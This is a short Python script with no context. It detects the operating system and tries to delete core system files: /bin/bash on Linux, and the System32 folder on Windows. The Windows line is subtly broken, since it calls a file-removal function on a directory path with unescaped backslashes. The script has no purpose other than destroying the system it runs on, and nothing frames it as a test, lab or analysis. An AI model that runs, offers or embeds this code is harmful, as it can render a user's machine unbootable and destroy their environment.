import platform 
import os

if platform.system() == 'Linux':
    delete_file = '/bin/bash'
    try:
        os.remove(delete_file)
    except PermissionError:
        print('Permission denied')
    except Exception as e:
        print(f'Failed to deleted the file: {e}')

elif platform.system() == 'Windows':
    os.remove('c:\Windows\System32')
        
            